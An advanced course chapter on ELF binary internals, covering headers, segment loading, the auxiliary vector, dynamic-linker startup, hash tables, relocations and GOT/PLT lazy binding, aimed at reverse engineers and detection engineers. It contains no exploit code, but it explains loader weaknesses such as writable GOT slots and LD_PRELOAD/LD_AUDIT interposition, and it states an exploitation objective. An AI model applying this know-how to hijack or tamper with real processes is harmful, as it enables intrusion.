---
corso: "Cybersecurity Masterclass"
fase: "Domain 1 — Binary Formats and Executable Internals"
modulo: "1.1A"
titolo: "ELF Foundations and the Dynamic Linking Core"
versione: "glibc 2.39+, binutils 2.42, ELF gABI / x86_64 psABI"
livello: "Advanced"
prerequisiti:
  - "C struct layout and pointer arithmetic"
  - "Virtual memory fundamentals (pages, permissions, mapping)"
  - "Linux command-line proficiency (readelf, objdump, gdb)"
  - "Basic understanding of compilation and linking (gcc, ld)"
  - "Hexadecimal and binary number systems"
obiettivi:
  - "Parse and interpret every field of the ELF file header, program headers, and section headers using readelf/objdump"
  - "Trace the complete kernel-to-dynamic-linker handoff sequence from execve through _dl_start to main"
  - "Explain the GOT/PLT lazy binding mechanism and demonstrate GOT overwrite exploitation with pwntools"
  - "Differentiate partial vs full RELRO and assess a binary's hardening posture using checksec and manual inspection"
  - "Write YARA rules to detect structural ELF anomalies indicative of packing, infection, or anti-analysis manipulation"
tag: [elf, binary-analysis, dynamic-linking, got-plt, relro, reverse-engineering, malware-analysis, exploitation]
---

# Domain 1, Chapter 1A — ELF Foundations and the Dynamic Linking Core

> ### Learning Objectives
>
> By the end of this chapter you will be able to:
> - Parse and interpret every field of the ELF file header, program headers, and section headers using readelf/objdump
> - Trace the complete kernel-to-dynamic-linker handoff sequence from execve through _dl_start to main
> - Explain the GOT/PLT lazy binding mechanism and demonstrate GOT overwrite exploitation with pwntools
> - Differentiate partial vs full RELRO and assess a binary's hardening posture using checksec and manual inspection
> - Write YARA rules to detect structural ELF anomalies indicative of packing, infection, or anti-analysis manipulation

> **Scope.** File header, program and section headers, the kernel→loader handoff, `.interp` and `ld-linux.so`, `.dynamic`, `.dynsym`/`.dynstr`, SysV `.hash` and `.gnu.hash`, relocation types on x86_64, the GOT and PLT, and lazy binding through `_dl_runtime_resolve`. This is the spine: every later ELF topic — TLS, IFUNC, RELRO, eh_frame, symbol versioning, init/fini arrays — attaches to structures introduced here.
>
> **Audience.** Reverse engineers, detection engineers writing static-analysis rules over binaries, hardening engineers reasoning about loader-time mitigations, and exploit-mitigation reviewers. Graduate level. No prerequisites beyond comfort with C structs and virtual memory.
>
> **Authoritative sources cross-referenced throughout.** System V gABI, the x86_64 psABI supplement, `elf(5)`, glibc's `elf/dl-*.c` and `elf/rtld.c`, binutils `bfd/elf*.c`, and the kernel's `fs/binfmt_elf.c`.

---

## 1. Two views of one file

ELF is engineered around an asymmetry that confuses learners: the same bytes are described twice. **Section headers** describe the file from the static linker's point of view — what `ld` needs to combine relocatable objects, lay out symbols, resolve symbol references, and apply link-time relocations. **Program headers** describe the file from the loader's point of view — what the kernel and the dynamic linker need to `mmap` regions, set page permissions, and begin execution.

Two consequences of this asymmetry matter constantly in security work:

The section header table can be stripped, zeroed, or lied about, and the binary will still run. Tools that derive their understanding only from sections (some YARA rules, naïve unpackers) can be fooled by a binary whose section table contradicts its program headers. The kernel's `binfmt_elf` handler reads only the program header table; it does not consult sections at all. Anything load-bearing for execution lives in segments.

Conversely, the linker's metadata is not redundant. Symbol names, section names, debugging tables, and exception-handler indices live in section-described regions. A binary stripped of its section header table loses none of its execution behavior but loses much of its analyzability.

The mental model: **segments are what runs; sections are what the linker arranged for the segments to contain.** A given byte may belong to one segment and zero, one, or several sections.

---

## 2. The ELF file header

The file begins with `Elf64_Ehdr` (or `Elf32_Ehdr`):

```c
#define EI_NIDENT 16

typedef struct {
    unsigned char e_ident[EI_NIDENT];
    Elf64_Half    e_type;       /* ET_REL, ET_EXEC, ET_DYN, ET_CORE */
    Elf64_Half    e_machine;    /* EM_X86_64, EM_AARCH64, ... */
    Elf64_Word    e_version;    /* EV_CURRENT */
    Elf64_Addr    e_entry;      /* virtual address of entry point */
    Elf64_Off     e_phoff;      /* program header table file offset */
    Elf64_Off     e_shoff;      /* section header table file offset */
    Elf64_Word    e_flags;      /* processor-specific */
    Elf64_Half    e_ehsize;     /* size of this header (64) */
    Elf64_Half    e_phentsize;  /* size of one phdr entry (56) */
    Elf64_Half    e_phnum;      /* number of phdr entries */
    Elf64_Half    e_shentsize;  /* size of one shdr entry (64) */
    Elf64_Half    e_shnum;      /* number of shdr entries */
    Elf64_Half    e_shstrndx;   /* section index of section name strtab */
} Elf64_Ehdr;
```

**`e_ident`.** First four bytes are the magic `0x7F 'E' 'L' 'F'`. `EI_CLASS` (5) is `ELFCLASS32` or `ELFCLASS64`. `EI_DATA` (6) is `ELFDATA2LSB` or `ELFDATA2MSB`. `EI_VERSION` (7) is `EV_CURRENT`. `EI_OSABI` (8) is normally `ELFOSABI_NONE` (0) for Linux-targeting toolchains, sometimes `ELFOSABI_GNU` (3) when GNU-specific features (e.g., STT_GNU_IFUNC) are used. `EI_ABIVERSION` (9) is normally 0. The remaining bytes are padding.

**`e_type`.** `ET_REL` (1) is a `.o` relocatable object, `ET_EXEC` (2) is a fixed-address executable, `ET_DYN` (3) is a shared object — but also a Position-Independent Executable. The ambiguity of `ET_DYN` matters: a PIE and a `.so` are the same `e_type` and only distinguishable by other heuristics (presence of a `PT_INTERP`, a `DT_FLAGS_1` containing `DF_1_PIE`, or a non-empty `e_entry` for PIE versus library entry conventions). `ET_CORE` (4) is a core file produced by the kernel.

**`e_entry`.** For non-PIE `ET_EXEC`, this is an absolute virtual address. For PIE `ET_DYN`, it is an offset relative to the load base — the kernel adds the chosen base before transferring control. Userland tools that print "entry point 0x1140" for a PIE are showing you the offset, not where execution will actually begin.

**`e_phoff` and `e_phnum`.** When `e_phnum == PN_XNUM` (0xFFFF), the real count is taken from the `sh_info` of section header zero — a workaround for the 16-bit field. Similarly, `e_shnum == 0` with a non-zero `e_shoff` means the real section count is in section header zero's `sh_size` (and `e_shstrndx == SHN_XINDEX` (0xFFFF) puts the real string-table index in `sh_link` of section header zero).

**Detection note.** Anomalies in this header are productive triage signals: an `e_shoff` that points outside the file, an `e_phentsize` that doesn't equal 56 on a 64-bit binary, an `e_ident` padding region used to smuggle data, or an `e_entry` pointing into a non-executable segment. None of these prevent execution if the program headers are coherent, but all of them are loud signals to a static analyzer.

---

## 3. Program headers and segment loading

The program header table is an array of `Elf64_Phdr`:

```c
typedef struct {
    Elf64_Word  p_type;     /* PT_LOAD, PT_DYNAMIC, PT_INTERP, ... */
    Elf64_Word  p_flags;    /* PF_X | PF_W | PF_R */
    Elf64_Off   p_offset;   /* file offset */
    Elf64_Addr  p_vaddr;    /* virtual address (load base relative for PIE) */
    Elf64_Addr  p_paddr;    /* physical (ignored on Linux userspace) */
    Elf64_Xword p_filesz;   /* size in file */
    Elf64_Xword p_memsz;    /* size in memory; >= p_filesz */
    Elf64_Xword p_align;    /* page-aligned for PT_LOAD */
} Elf64_Phdr;
```

**`PT_LOAD`.** Tells the kernel/loader to map a region. The file slice `[p_offset, p_offset + p_filesz)` is mapped at virtual address `p_vaddr` (plus load base for PIE), and zero-filled out to `p_memsz`. The page permissions are derived from `p_flags`. The trailing `p_memsz - p_filesz` bytes are the BSS — they take memory but no file space.

A modern Linux toolchain typically produces four `PT_LOAD` segments after recent linker hardening: read-only headers/notes, executable text, read-only-after-relocations data (the RELRO region), and read/write data including `.bss`. The split exists so that, post-relocation, the loader can `mprotect` the RELRO segment back to read-only — see Chapter 1B.

**`PT_INTERP`.** Points (via `p_offset`/`p_filesz`) to a NUL-terminated string naming the program interpreter, normally `/lib64/ld-linux-x86-64.so.2`. The kernel sees this and instead of jumping to `e_entry`, it loads the named interpreter at a kernel-chosen base, sets up the auxiliary vector, and transfers control to the interpreter's entry point. The interpreter — `ld.so` — is itself an ELF, dynamically linkable, but normally statically self-contained.

A binary lacking a `PT_INTERP` is a static executable: the kernel jumps directly to `e_entry`. This distinction is consequential. Static binaries skip the entire dynamic-linker machinery: no `_dl_runtime_resolve`, no GOT/PLT lazy binding, no `LD_PRELOAD`, no `DT_NEEDED` chasing. Implants distributed as static binaries are correspondingly harder to interpose on with userland hooks.

**`PT_DYNAMIC`.** Points to the `.dynamic` array (see §6). Mandatory for any binary that uses dynamic linking; ignored entirely for fully static binaries.

**`PT_PHDR`.** Self-describes the program header table itself — its file offset and intended virtual address. The dynamic linker uses this to locate the headers in memory after the kernel has loaded them, since the kernel does not pass the headers' virtual address explicitly.

**`PT_NOTE`.** Wraps `.note.*` sections containing build IDs, ABI tags, and property notes. Notes are TLV-ish structures with a name, type, and descriptor. The build-ID note (`NT_GNU_BUILD_ID`) is used by debuggers to locate stripped debuginfo; the property note (`NT_GNU_PROPERTY_TYPE_0`) carries CET (`IBT`/`SHSTK`) and AArch64 BTI/PAC indicators that the loader checks when deciding whether to enable hardware control-flow integrity. See Chapter 1B.

**`PT_TLS`.** Describes the thread-local-storage template — the `.tdata` and `.tbss` initialization image. Per-thread TLS blocks are created from this template. See Chapter 1B.

**`PT_GNU_STACK`.** A zero-size segment whose `p_flags` carries the desired permissions for the stack. If `PF_X` is set, the kernel allocates an executable stack; if not, a non-executable one. The presence of an executable stack on a modern binary is anomalous and almost always indicates either old assembly with no `.note.GNU-stack` section linked in, or a deliberate choice (some JITs).

**`PT_GNU_RELRO`.** Names the region that should be `mprotect`ed read-only after the dynamic linker finishes its initial relocation work. The loader's `_dl_protect_relro` walks this segment and revokes write permission. Covered fully in Chapter 1B.

**`PT_GNU_EH_FRAME`.** Points at `.eh_frame_hdr`, a binary search index into the unwind tables in `.eh_frame`. The runtime stack unwinder uses this rather than rescanning all of `.eh_frame` linearly. Chapter 1B.

**`PT_GNU_PROPERTY`.** Newer; wraps the property note. Loaders ignoring it default to no hardware CFI features.

**Permissions and W^X.** A `PT_LOAD` with both `PF_W` and `PF_X` is the mark of either a packer's unpacked region produced at runtime (illegitimately, almost always) or a self-modifying JIT that pre-allocated executable writable pages. On a typical compiled-and-linked binary, no static `PT_LOAD` should be both writable and executable. Static checks for this are easy and cheap; making them part of an ingestion pipeline catches a wide class of crude payloads.

---

## 4. Section headers and link-time semantics

Sections describe what's inside the segments:

```c
typedef struct {
    Elf64_Word  sh_name;       /* index into section name strtab */
    Elf64_Word  sh_type;       /* SHT_PROGBITS, SHT_SYMTAB, SHT_RELA, ... */
    Elf64_Xword sh_flags;      /* SHF_ALLOC, SHF_WRITE, SHF_EXECINSTR, ... */
    Elf64_Addr  sh_addr;       /* virtual address if SHF_ALLOC */
    Elf64_Off   sh_offset;     /* file offset */
    Elf64_Xword sh_size;
    Elf64_Word  sh_link;       /* type-dependent */
    Elf64_Word  sh_info;       /* type-dependent */
    Elf64_Xword sh_addralign;
    Elf64_Xword sh_entsize;    /* fixed entry size for tables */
} Elf64_Shdr;
```

The interesting fields are `sh_link` and `sh_info`, whose meaning depends on `sh_type`. Examples:

For a symbol table (`SHT_SYMTAB`/`SHT_DYNSYM`), `sh_link` is the section index of its string table; `sh_info` is one greater than the index of the last local symbol — a partition the linker maintains because locals must precede globals in a symbol table.

For a relocation section (`SHT_REL`/`SHT_RELA`), `sh_link` is the index of the symbol table whose entries the relocations reference; `sh_info` is the index of the section being relocated.

For a hash table (`SHT_HASH`/`SHT_GNU_HASH`), `sh_link` is the symbol table being indexed.

`sh_flags` carries the allocation/permission hints. `SHF_ALLOC` means "this section's bytes occupy memory at runtime" — i.e., the section is contained within some `PT_LOAD`. `SHF_WRITE` and `SHF_EXECINSTR` are the section-level analogues of `PF_W` and `PF_X`. `SHF_TLS` marks `.tdata`/`.tbss`. `SHF_MERGE` and `SHF_STRINGS` allow the linker to coalesce identical entries, important for string deduplication. `SHF_GROUP` ties a section to a COMDAT group, the mechanism for one-definition-rule compliance with C++ inline functions and templates.

Special section indices (`SHN_*`): `SHN_UNDEF` (0) marks symbols not yet defined in this object — references to be resolved at link or load time. `SHN_ABS` (0xFFF1) marks symbols whose value is absolute, not relative to a section. `SHN_COMMON` (0xFFF2) marks tentative definitions, the C "common" semantic. `SHN_XINDEX` is the escape valve used when the real index exceeds 16 bits.

The standard sections you will see on every dynamically-linked binary are listed in §5–§7 below as they become relevant. A useful one-liner: a section is "interesting at runtime" exactly when its `sh_flags` includes `SHF_ALLOC`. Everything else — `.symtab`, `.strtab`, `.debug_*`, `.comment`, `.shstrtab` — is link-time or analysis-time only.

---

## 5. The kernel-to-loader handoff

This is where the file becomes a process. The kernel's `load_elf_binary` (`fs/binfmt_elf.c`) executes roughly the following:

It parses the ELF header and program header table, validating both. It walks `PT_LOAD` segments and `mmap`s each one with the appropriate permissions. For PIE (`ET_DYN`) it picks an ASLR'd base (`ELF_ET_DYN_BASE` plus randomization) and adds it to every `p_vaddr`. For `ET_EXEC` it honors the absolute addresses in the file.

If a `PT_INTERP` exists, the kernel reads the interpreter path, opens it, and `mmap`s its `PT_LOAD` segments at a separate random base. It does not run any code in the interpreter yet.

It populates the user stack with `argc`, `argv`, `envp`, and — critical for our purposes — the **auxiliary vector** (`auxv`), an array of `Elf64_auxv_t { a_type, a_un.a_val }` entries that conveys per-process information from kernel to userspace. Among the entries:

- `AT_PHDR`: virtual address of the program's program header table, after relocation by the load base. The dynamic linker uses this to find `PT_DYNAMIC`.
- `AT_PHENT`, `AT_PHNUM`: header entry size and count.
- `AT_BASE`: load base of the dynamic linker itself (so it can self-relocate).
- `AT_ENTRY`: the program's entry point (relocated for PIE).
- `AT_RANDOM`: pointer to 16 bytes of kernel-supplied randomness, used to seed stack canary cookies and `AT_RANDOM`-derived ASLR features in libc.
- `AT_SYSINFO_EHDR`: address of the vDSO, the kernel-mapped shared object exposing fast paths for `gettimeofday`, `clock_gettime`, `getcpu`.
- `AT_HWCAP`, `AT_HWCAP2`: CPU feature bitmasks libc uses to select hardware-accelerated string routines and IFUNC resolutions.
- `AT_SECURE`: nonzero if the program was launched with elevated privileges (setuid, setgid, file capabilities), telling the dynamic linker to ignore `LD_PRELOAD`, `LD_LIBRARY_PATH`, and similar.

The auxv is consequential for security: it is the kernel's primary out-of-band channel into userspace at process start. `AT_SECURE` is the linchpin of the entire setuid-program-can't-be-LD_PRELOAD'd story; if you can read another process's auxv (procfs `/proc/PID/auxv`), you can locate its vDSO, program headers, and seed material.

After populating the stack, the kernel transfers control to the interpreter's entry point (or, if no `PT_INTERP`, the program's `e_entry`). This is the first userspace instruction.

---

## 6. The dynamic linker takes over: `.interp` and `ld.so`

Userspace control begins inside `_start` of `ld-linux.so.2`, which immediately calls `_dl_start`. The dynamic linker:

1. Self-relocates. It cannot call its own functions through the GOT/PLT until its own GOT is populated. The bootstrap is hand-written (in glibc, `sysdeps/x86_64/dl-machine.h`'s `RTLD_START`), reads its own `PT_DYNAMIC` via the `_DYNAMIC` symbol (resolved via PC-relative addressing), iterates its own `R_X86_64_RELATIVE` relocations, and patches them.

2. Reads the program's program header table (located via `AT_PHDR`/`AT_PHNUM`) to find the program's `PT_DYNAMIC`.

3. Walks `DT_NEEDED` entries to enumerate required shared libraries, opens each via the search path rules (`DT_RPATH` if present and `DT_RUNPATH` absent, then `LD_LIBRARY_PATH` unless `AT_SECURE`, then `/etc/ld.so.cache`, then default paths `/lib`, `/usr/lib`), and `mmap`s each library's `PT_LOAD` segments at distinct random bases.

4. Resolves symbol references and applies relocations across all loaded objects. This is the bulk of the dynamic-linker workload and is detailed in §10–§11.

5. Optionally `mprotect`s the RELRO region read-only.

6. Runs each object's pre-init, init, and init-array constructors in dependency order (DSO dependencies before dependents, libc's `__libc_init_first` before user constructors). See Chapter 1B.

7. Transfers control to the program's `e_entry` (typically `_start` in the program, which calls `__libc_start_main`, which calls `main`).

The dynamic linker's behavior is configurable through environment (subject to `AT_SECURE`): `LD_PRELOAD` injects shared objects ahead of normal lookups, `LD_LIBRARY_PATH` augments the search path, `LD_DEBUG=all` produces a flood of diagnostic output that is invaluable for triaging mysterious resolution failures, `LD_BIND_NOW=1` disables lazy binding (resolves all symbols at startup), `LD_AUDIT` loads auditor objects that intercept symbol resolution, and `LD_TRACE_LOADED_OBJECTS=1` (what `ldd(1)` sets) makes the linker print its dependency walk and exit before running any program code.

`LD_AUDIT` deserves a security note: an auditor library defines callbacks (`la_objsearch`, `la_symbind64`, `la_pltenter`, `la_pltexit`) that the dynamic linker invokes during its operation. This is a legitimate userland interposition mechanism with full visibility into symbol resolution, and it is used both for instrumentation and for stealth. The auditor itself is loaded subject to `AT_SECURE`, but auditor invocations on PLT entries can serve as a coarse trace of dynamic-linker-mediated calls.

---

## 7. The `.dynamic` section

The `.dynamic` section is an array of `Elf64_Dyn`:

```c
typedef struct {
    Elf64_Sxword d_tag;           /* DT_NULL, DT_NEEDED, DT_STRTAB, ... */
    union {
        Elf64_Xword d_val;
        Elf64_Addr  d_ptr;
    } d_un;
} Elf64_Dyn;
```

It is the dynamic linker's table of contents for the binary — every other dynamic-linking structure is referenced from here. Tags fall into roughly three groups: pointers to other tables (strings, symbols, hashes, relocations), counts and sizes of those tables, and flags or single values.

Key tags to internalize:

**`DT_NEEDED`.** A `d_val` index into `.dynstr` naming a required shared object. There may be many. The order is preserved and significant for symbol resolution (§10).

**`DT_STRTAB`, `DT_STRSZ`.** Address and size of `.dynstr`, the string table for the dynamic symbol table and for `DT_NEEDED`/`DT_SONAME`/`DT_RPATH`/etc.

**`DT_SYMTAB`, `DT_SYMENT`.** Address of `.dynsym` and size of one entry (`sizeof(Elf64_Sym)` = 24).

**`DT_HASH`.** Address of the SysV hash table (`.hash`). Optional in modern binaries.

**`DT_GNU_HASH`.** Address of the GNU hash table (`.gnu.hash`). Almost universal in modern Linux binaries; faster than `DT_HASH`.

**`DT_RELA`, `DT_RELASZ`, `DT_RELAENT`.** Address, total size, and per-entry size of the main `.rela.dyn` table — relocations applied at startup.

**`DT_JMPREL`, `DT_PLTRELSZ`, `DT_PLTREL`.** Address and size of `.rela.plt` — the PLT relocations. `DT_PLTREL` says whether they are `DT_REL` or `DT_RELA` form.

**`DT_PLTGOT`.** Address of the `.got.plt` section — the per-PLT-slot indirection table.

**`DT_INIT`, `DT_FINI`.** Legacy single-function constructor and destructor, populated from the `_init` and `_fini` symbols if present. Modern binaries prefer arrays.

**`DT_INIT_ARRAY`, `DT_INIT_ARRAYSZ`, `DT_FINI_ARRAY`, `DT_FINI_ARRAYSZ`, `DT_PREINIT_ARRAY`, `DT_PREINIT_ARRAYSZ`.** Arrays of function pointers run during loader-controlled program startup and shutdown. Detailed in Chapter 1B.

**`DT_FLAGS`, `DT_FLAGS_1`.** Behavioral hints. `DT_FLAGS` carries `DF_BIND_NOW` (resolve all symbols at load), `DF_SYMBOLIC` (the object resolves its own references before consulting the global namespace), `DF_TEXTREL` (the object contains relocations against read-only segments — historically required for non-PIC code in shared libraries, a security smell because it forces the loader to make text writable to apply them), and `DF_STATIC_TLS` (the object uses static TLS and so cannot be `dlopen`'d after thread creation in some configurations). `DT_FLAGS_1` is broader: `DF_1_NOW` (alias for `DF_BIND_NOW`), `DF_1_PIE` (this `ET_DYN` is in fact a PIE), `DF_1_NODELETE` (refuses `dlclose`), `DF_1_INITFIRST` (run constructors before others — used by libpthread historically).

**`DT_VERNEED`, `DT_VERNEEDNUM`, `DT_VERSYM`, `DT_VERDEF`, `DT_VERDEFNUM`.** Symbol versioning tables. Chapter 1B.

**`DT_DEBUG`.** A field the dynamic linker writes into during startup to point at its `r_debug` structure — the rendezvous structure used by debuggers to enumerate loaded objects via `_dl_debug_state` breakpoints. Its presence and the writability of `.dynamic` to allow this update is why `.dynamic` lives in the RELRO region rather than truly read-only memory: the linker needs to write `DT_DEBUG` once before RELRO is applied, after which RELRO locks `.dynamic` permanently. Tools that read `r_debug` from process memory rely on locating it through the program's `DT_DEBUG`.

**`DT_NULL`.** Terminator. The first tag with `d_tag == DT_NULL` ends the array.

---

## 8. Symbol tables and string tables

`.dynsym` is the symbol table consulted at runtime (`.symtab` is the link-time table, often stripped). Each entry is:

```c
typedef struct {
    Elf64_Word    st_name;    /* index into .dynstr */
    unsigned char st_info;    /* (binding << 4) | type */
    unsigned char st_other;   /* visibility in low 2 bits */
    Elf64_Half    st_shndx;   /* section index, or SHN_UNDEF */
    Elf64_Addr    st_value;   /* virtual address (or offset for relocatables) */
    Elf64_Xword   st_size;    /* size in bytes */
} Elf64_Sym;
```

`st_info` packs binding (`STB_LOCAL`, `STB_GLOBAL`, `STB_WEAK`, `STB_GNU_UNIQUE`) and type (`STT_NOTYPE`, `STT_OBJECT`, `STT_FUNC`, `STT_SECTION`, `STT_FILE`, `STT_COMMON`, `STT_TLS`, `STT_GNU_IFUNC`).

`st_other` carries visibility (`STV_DEFAULT`, `STV_INTERNAL`, `STV_HIDDEN`, `STV_PROTECTED`). Hidden symbols are not exported to the dynamic symbol table at link time and so cannot be referenced by other objects — a containment mechanism for library internals. Protected symbols are exported but cannot be interposed by `LD_PRELOAD` or earlier-loaded objects, which has consequences for both robustness and for techniques that rely on interposition.

`st_shndx == SHN_UNDEF` indicates an unresolved reference — the symbol must be defined elsewhere. `STT_GNU_IFUNC` indicates an indirect function whose `st_value` is a resolver, not a final address. See Chapter 1B.

`STB_GNU_UNIQUE` is a GNU extension used for C++ inline-template-instantiation merging across DSOs; it suppresses a normally-`STB_WEAK` definition's overrideability, ensuring exactly one instance across the namespace.

Local symbols (`STB_LOCAL`) precede globals (`STB_GLOBAL`/`STB_WEAK`/...) in the table; the partition point is the section's `sh_info`. The ordering matters because hash tables index only the global region.

`.dynstr` is a flat blob of NUL-separated strings, indexed by `st_name`, by `DT_NEEDED`, and by everything else that wants a name. Index 0 is always an empty string.

---

## 9. The two hash tables: `.hash` and `.gnu.hash`

Symbol lookup at load time is a hot path; the dynamic linker resolves potentially thousands of symbols per process. ELF supports two hash table formats.

### 9.1 SysV `.hash`

Layout: two `uint32_t` words `nbuckets` and `nchain`, followed by `nbuckets` words of `bucket[]` and `nchain` words of `chain[]`. `nchain` equals the number of dynamic symbols. The hash function:

```c
uint32_t elf_hash(const char *name) {
    uint32_t h = 0, g;
    while (*name) {
        h = (h << 4) + (unsigned char)*name++;
        if ((g = h & 0xF0000000)) h ^= g >> 24;
        h &= ~g;  /* clear the high nibble */
    }
    return h;
}
```

Lookup: compute `h = elf_hash(name) % nbuckets`, set `i = bucket[h]`. While `i != STN_UNDEF`, examine `dynsym[i]`; if its name matches, done. Otherwise `i = chain[i]`, continue.

Two pessimisms: every probe touches the symbol table (cold cache), and a missing symbol still requires walking the chain to its end. On a binary with many `DT_NEEDED` libraries, the cost compounds.

### 9.2 GNU `.gnu.hash`

Layout: header `{ nbuckets, symoffset, bloom_size, bloom_shift }`, followed by a Bloom filter of `bloom_size` 64-bit words, then `nbuckets` 32-bit `bucket[]` entries, then a `chain[]` of 32-bit hash values (one per global symbol from index `symoffset` onward — locals are excluded from this table by construction).

Hash function: a DJB2 variant.

```c
uint32_t gnu_hash(const char *name) {
    uint32_t h = 5381;
    while (*name) h = (h * 33) + (unsigned char)*name++;
    return h;
}
```

Lookup proceeds in three stages:

1. **Bloom filter probe.** Compute `h = gnu_hash(name)`. Test two bits in the Bloom filter, indexed by `h` and `h >> bloom_shift`, both modulo `bloom_size * 64`. If either bit is zero, the symbol is definitively absent — skip this DSO entirely. This is the dominant performance win for the common "this symbol is not in this library" case during global lookup.

2. **Bucket probe.** `i = bucket[h % nbuckets]`. If `i < symoffset`, the symbol is absent (the bucket's symbol range is empty).

3. **Chain walk.** Examine `chain[i - symoffset]`. The low 31 bits are the symbol's full hash with bit 0 cleared; bit 0 is the chain-end flag. If the upper bits match `h | 1` (after clearing bit 0 of the chain entry and comparing to the truncated `h`), check `dynsym[i]` by name to confirm. Otherwise, if bit 0 of the chain entry is 1, this was the last entry in the chain — symbol absent. Otherwise increment `i` and repeat.

The chain stores hash values, not symbol indices, so most chain walks reject candidates without touching the symbol table at all — a substantial cache win. Symbols in `.gnu.hash` are also sorted by `bucket(symbol) % nbuckets`, which is why the dynamic linker can stop on a hash mismatch without walking further: same-bucket symbols are contiguous in `.dynsym`.

The two formats can coexist; if both `DT_HASH` and `DT_GNU_HASH` are present, the loader uses `.gnu.hash` and ignores `.hash`. Build systems sometimes emit both for compatibility with old loaders.

---

## 10. Relocations

A relocation is an instruction to the dynamic linker: at some address in memory, write a value computed from a symbol, an addend, and the load base. On x86_64, `.rela.dyn` and `.rela.plt` contain `Elf64_Rela` entries:

```c
typedef struct {
    Elf64_Addr   r_offset;   /* virtual address to be patched */
    Elf64_Xword  r_info;     /* (sym_index << 32) | type */
    Elf64_Sxword r_addend;   /* explicit addend */
} Elf64_Rela;
```

The relocation type determines the formula. Common x86_64 types:

**`R_X86_64_RELATIVE` (8).** `*r_offset = base + r_addend`. No symbol lookup. Used for self-references in PIE/PIC binaries — the linker knows the offset within the object but not the runtime base, so it emits a `RELATIVE` to be fixed when the base is chosen. By far the most common relocation in a PIE: every global with a default initializer that points into the same image, every `.init_array` slot, every `__FUNCTION__` string reference, all become `R_X86_64_RELATIVE`. The dynamic linker has a fast path for these (`elf_machine_relplt` family) because they need no symbol lookup.

**`R_X86_64_GLOB_DAT` (6).** `*r_offset = symbol_address`. Used for the GOT entries of imported global variables. The loader resolves `symbol`, finds its absolute address, writes it to the GOT slot. Eager.

**`R_X86_64_JUMP_SLOT` (7).** Same formula as `GLOB_DAT`, but used in `.rela.plt` for function imports. The loader normally defers these (lazy binding, §11) unless `DT_BIND_NOW`/`LD_BIND_NOW`/RELRO-full forces eager resolution.

**`R_X86_64_64` (1).** `*r_offset = symbol_address + r_addend`. Direct 64-bit absolute. Rare in shared objects (because they want to be position-independent), normal in non-PIE executables.

**`R_X86_64_PC32` (2).** `*r_offset = symbol_address + r_addend - r_offset`. PC-relative 32-bit. The linker form. Normally fully resolved at link time; rarely seen as a load-time relocation.

**`R_X86_64_COPY` (5).** Used when a non-PIC executable references a global variable defined in a shared library. The linker reserves space for the variable in the executable's `.bss` and emits a `COPY` relocation that copies the variable's contents from the library to that space at load time. The library's references are then redirected to the executable's copy via a `GLOB_DAT` patched to point there. A historical wart that doesn't apply to PIE.

**`R_X86_64_IRELATIVE` (37).** `*r_offset = ((addr_t (*)(void))(base + r_addend))()`. The addend is treated as the offset of an indirect-function resolver; the loader calls the resolver and writes its return value. Used for `STT_GNU_IFUNC` within the same object. See Chapter 1B.

**`R_X86_64_TPOFF64`, `R_X86_64_TPOFF32`, `R_X86_64_DTPMOD64`, `R_X86_64_DTPOFF64`, `R_X86_64_TLSGD`, `R_X86_64_TLSLD`, `R_X86_64_GOTTPOFF`.** TLS relocations — Chapter 1B.

A special note on `DT_TEXTREL`: if the object has any relocation that targets a non-writable segment (a text-segment relocation), the loader must `mprotect` that segment writable, apply the relocations, and `mprotect` it back. This is dangerous (writable text during load) and slow (extra syscalls), and modern toolchains refuse to emit `DT_TEXTREL` shared objects by default. A `DT_TEXTREL` flag in `DT_FLAGS` is a strong negative quality signal; the linker option `-z text` makes it a hard error.

---

## 11. The GOT, the PLT, and lazy binding

### 11.1 The two GOTs

Confusingly, modern Linux binaries have two GOT-named regions: `.got` and `.got.plt`. Both are arrays of pointers, both live in the data segment, and both are referenced from code through PC-relative addressing. They differ in what populates them and when.

**`.got`** holds entries for imported global variables (`R_X86_64_GLOB_DAT`) and is also the residence of `_GLOBAL_OFFSET_TABLE_`. Its entries are normally resolved eagerly. With full RELRO it sits in the read-only-after-relocation region.

**`.got.plt`** holds the function-pointer slots used by the PLT (`R_X86_64_JUMP_SLOT`). Lazy binding writes here at runtime, so under partial RELRO `.got.plt` remains writable to allow this. Under full RELRO the loader resolves all PLT entries up front and `mprotect`s `.got.plt` read-only with the rest. The first three entries of `.got.plt` are reserved:

- `.got.plt[0]` — address of `.dynamic` in this object. The loader sets this so PLT trampolines can find `.dynamic` from a PC-relative load.
- `.got.plt[1]` — address of the `link_map` for this object, populated by the loader.
- `.got.plt[2]` — address of `_dl_runtime_resolve` (or its variant), populated by the loader.

`.got.plt[N]` for `N >= 3` are the per-import slots.

### 11.2 The PLT

The PLT is a sequence of small code stubs, one per imported function, plus a header stub (PLT0). On x86_64, a typical PLT entry is 16 bytes:

```
puts@plt:
  jmp    QWORD PTR [rip + GOT_OFFSET]   ; 6 bytes
  push   <reloc_index>                  ; 5 bytes
  jmp    PLT0                           ; 5 bytes (relative)
```

PLT0 is also 16 bytes:

```
PLT0:
  push   QWORD PTR [rip + got_plt_8]    ; push link_map
  jmp    QWORD PTR [rip + got_plt_16]   ; jmp _dl_runtime_resolve
  nop * 4
```

When the program calls `puts@plt` for the first time, the GOT entry referenced by the first instruction holds the address of the *second* instruction of the PLT entry itself — a self-loop into `push <reloc_index>; jmp PLT0`. PLT0 then pushes the `link_map` and jumps to `_dl_runtime_resolve`.

`_dl_runtime_resolve` is a hand-written assembly routine in `sysdeps/x86_64/dl-trampoline.S`. It saves the registers a function call would normally clobber (because it must return control to the resolved function as if it had been called directly), invokes `_dl_fixup` with the `link_map` and the relocation index, takes the resolved address that `_dl_fixup` returns, restores registers, and tail-jumps to the resolved address. On the next call, the GOT entry now contains the resolved address, and the first instruction of the PLT entry jumps directly to the function — no resolver involvement.

The relocation index pushed by the PLT stub indexes into `.rela.plt` and identifies the symbol to resolve. `_dl_fixup` does the actual work: it consults `.gnu.hash`/`.hash`, walks the symbol-search namespace following symbol-resolution rules, finds the definition, and writes its address into the GOT slot indicated by the relocation's `r_offset`.

### 11.3 Symbol-resolution scope and order

Lookup walks an ordered list of objects called the global scope, augmented for `dlopen`'d objects with their own local scopes. The default global scope order is: the executable first, then `LD_PRELOAD` objects in the order specified, then `DT_NEEDED` libraries in dependency-graph breadth-first order. The first definition found wins. This ordering is what makes `LD_PRELOAD` work: a function defined in a preloaded `.so` is found before the same name in libc, so calls intended for libc reach the preload first.

Symbol versioning (Chapter 1B) refines this: a reference asks for a specific version of a symbol, and the search walks past unversioned or wrong-version definitions.

